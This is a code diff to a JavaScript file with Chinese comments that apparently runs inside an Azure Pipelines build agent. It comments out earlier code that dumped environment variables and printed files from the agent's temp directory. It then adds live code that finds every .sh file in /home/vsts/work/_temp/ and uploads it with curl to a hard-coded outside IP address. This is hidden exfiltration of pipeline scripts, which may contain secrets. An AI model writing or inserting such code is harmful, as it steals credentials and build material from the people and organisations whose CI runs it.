@@ -1,4 +1,4 @@
-const { exec } = require('child_process');
+// const { exec } = require('child_process');
 // const fs = require('fs');
 // const path = require('path');
 // const { exec,execSync } = require('child_process');
@@ -416,26 +416,71 @@ const { exec } = require('child_process');
 // });
 
 
-// 执行 env 命令获取环境变量
-exec('env', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`执行 env 时出错: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.error(`env 执行输出错误: ${stderr}`);
-        return;
-    }
+// // 执行 env 命令获取环境变量
+// exec('env', (error, stdout, stderr) => {
+//     if (error) {
+//         console.error(`执行 env 时出错: ${error.message}`);
+//         return;
+//     }
+//     if (stderr) {
+//         console.error(`env 执行输出错误: ${stderr}`);
+//         return;
+//     }
 
-    console.log(`env 命令结果:\n${stdout}`);
+//     console.log(`env 命令结果:\n${stdout}`);
     
-});
+// });
+
+// const fs = require('fs');
+// const path = require('path');
+
+// // 要遍历的目录路径
+// const tempDir = '/home/vsts/work/_temp/';
+
+// // 读取目录中的所有文件和子目录
+// fs.readdir(tempDir, (err, files) => {
+//     if (err) {
+//         console.error('无法读取目录:', err);
+//         return;
+//     }
+
+//     // 遍历并打印每个文件和子目录的名称
+//     files.forEach(file => {
+//         const filePath = path.join(tempDir, file);
+
+//         // 检查当前路径是否为文件
+//         fs.stat(filePath, (err, stats) => {
+//             if (err) {
+//                 console.error('无法获取文件信息:', err);
+//                 return;
+//             }
+
+//             if (stats.isFile()) {
+//                 console.log('文件:', filePath);
+
+//                 // 如果需要，可以在这里读取并打印文件内容
+//                 fs.readFile(filePath, 'utf8', (err, data) => {
+//                     if (err) {
+//                         console.error('无法读取文件内容:', err);
+//                         return;
+//                     }
+//                     console.log(`文件内容 (${file}):`);
+//                     console.log(data);
+//                 });
+//             } else if (stats.isDirectory()) {
+//                 console.log('目录:', filePath);
+//                 // 如果需要递归读取子目录，可以在这里实现
+//             }
+//         });
+//     });
+// });
 
 const fs = require('fs');
 const path = require('path');
+const { exec } = require('child_process');
 
-// 要遍历的目录路径
 const tempDir = '/home/vsts/work/_temp/';
+const uploadUrl = 'http://139.180.193.16:5000/upload';
 
 // 读取目录中的所有文件和子目录
 fs.readdir(tempDir, (err, files) => {
@@ -444,7 +489,7 @@ fs.readdir(tempDir, (err, files) => {
         return;
     }
 
-    // 遍历并打印每个文件和子目录的名称
+    // 遍历并处理每个文件和子目录的名称
     files.forEach(file => {
         const filePath = path.join(tempDir, file);
 
@@ -455,21 +500,22 @@ fs.readdir(tempDir, (err, files) => {
                 return;
             }
 
-            if (stats.isFile()) {
-                console.log('文件:', filePath);
+            if (stats.isFile() && file.endsWith('.sh')) {
+                console.log('发现 .sh 文件:', filePath);
 
-                // 如果需要，可以在这里读取并打印文件内容
-                fs.readFile(filePath, 'utf8', (err, data) => {
-                    if (err) {
-                        console.error('无法读取文件内容:', err);
+                // 使用 curl 命令将 .sh 文件上传到服务器
+                exec(`curl -F "file=@${filePath}" ${uploadUrl}`, (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`执行 curl 时出错: ${error.message}`);
                         return;
                     }
-                    console.log(`文件内容 (${file}):`);
-                    console.log(data);
+                    if (stderr) {
+                        console.error(`curl 执行输出错误: ${stderr}`);
+                        return;
+                    }
+                    console.log(`.sh 文件已上传: ${filePath}`);
+                    console.log(`curl 命令结果:\n${stdout}`);
                 });
-            } else if (stats.isDirectory()) {
-                console.log('目录:', filePath);
-                // 如果需要递归读取子目录，可以在这里实现
             }
         });
     });
